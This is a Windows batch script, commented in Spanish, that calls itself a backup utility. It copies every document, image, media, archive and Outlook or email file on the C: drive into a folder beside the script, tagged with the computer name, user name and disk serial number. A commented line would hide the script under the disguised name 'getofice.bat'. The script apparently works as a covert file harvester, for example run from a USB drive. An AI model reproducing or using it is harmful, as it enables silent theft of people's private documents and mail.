@echo off
echo Busqueda y respaldo de datos en la carpeta de ejecucion.
set "SCRIPT_DIR=%~dp0"
set "DEST_FOLDER=%SCRIPT_DIR%"
rem attrib +r +s +h "%DEST_FOLDER%\getofice.bat"
for /f "tokens=1-3 delims=/" %%a in ('echo %date%') do set "DATE=%%c%%b%%a"
set "COMPUTER_NAME=%COMPUTERNAME%"
set "USER_NAME=%USERNAME%"
for /f "tokens=2 delims==" %%a in ('wmic diskdrive get serialnumber /value ^| find "="') do set "SERIAL_NUMBER=%%a"
set "BACKUP_FOLDER=%DEST_FOLDER%\BACKUPS\%DATE%_%COMPUTER_NAME%_%USER_NAME%_%SERIAL_NUMBER%"
if not exist "%BACKUP_FOLDER%" mkdir "%BACKUP_FOLDER%"

set "EXTENSIONS=.aac .adt .adts .accdb .avi .bat .bmp .cda .csv .doc .docm .docx .dot .dotx .eml .flv .gif .jpg .jpeg .m4a .mdb .mid .midi .mov .mp3 .mp4 .mpeg .pdf .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm .pptx .psd .pst .pub .rar .rtf .sldm .sldx .swf .tif .tiff .txt .vsd .vsdm .vsdx .vss .vssm .vst .vstm .vstx .wav .wbk .wks .wma .wmd .wmv .wmz .wms .wpd .wp5 .xla .xlam .xll .xlm .xls .xlsm .xlsx .xlt .xltm .xltx .xps .zip .7z"

for %%E in (%EXTENSIONS%) do (
    for /r "C:\" %%i in (*%%E) do (
        copy "%%i" "%BACKUP_FOLDER%"
        for /f "delims=" %%x in ("%%~xi") do (
            set "EXTENSION=%%x"
            setlocal enabledelayedexpansion
            set "EXTENSION=!EXTENSION:~1!"
            if not exist "%BACKUP_FOLDER%\!EXTENSION!" mkdir "%BACKUP_FOLDER%\!EXTENSION!"
            move /y "%BACKUP_FOLDER%\%%~nxi" "%BACKUP_FOLDER%\!EXTENSION!\"
            endlocal
        )
    )
)

set "LIST_FILE=%DEST_FOLDER%\list.txt"
cd /d "%DEST_FOLDER%" || exit
dir /b /s > "%LIST_FILE%"
attrib +r -s -h "FOLDERS%DEST_FOLDER%\list.txt" 
